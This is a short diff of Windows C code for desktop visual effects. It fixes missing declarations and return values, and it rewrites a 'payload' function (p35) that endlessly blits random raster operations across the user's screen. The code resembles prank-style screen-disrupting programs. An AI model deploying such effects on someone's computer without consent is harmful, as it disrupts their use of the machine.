@@ -79,7 +79,7 @@ int p2()
 int p3()
 {
 	HWND desktop = GetDesktopWindow();
-	//RECT rect;
+	RECT rect;
 	GetWindowRect(desktop, &rect);
 	INT w = rect.right - rect.left;
 	INT h = rect.bottom - rect.top;
@@ -822,6 +822,7 @@ int p33()
 	}
 	DeleteObject(bmp);
 	DeleteDC(compatibleDC);
+	return 0;
 }
 
 // BitBlt the screen
@@ -835,18 +836,19 @@ int p34()
 	{
 		BitBlt(hDesk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, hDesk, -i, 0, SRCCOPY);
 	}
+	return 0;
 }
 
-// 0x7302400
-// Randomly generate payloads on client side
-int p35() // DO IN THREAD
-{
-	DWORD rop;
-	whiletrue {
-		rop = rand() % 0x99999999 * 0x500;
-		fori(1000)
-		{
-			BitBlt(hDesk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, hDesk, 0, 0, rop);
+// Put randomly generated effects on the user's screen
+int p35() {
+	Sleep(rand() % 10000);
+	HDC desk = GetDC(NULL);
+	while (true) {
+		DWORD randNum = (rand() % 0x99999999) * 0x500;
+		for (int i = 0; i < 500; i++) {
+			BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, randNum);		
 		}
+		Sleep(1000);
 	}
+	return 0;
 }
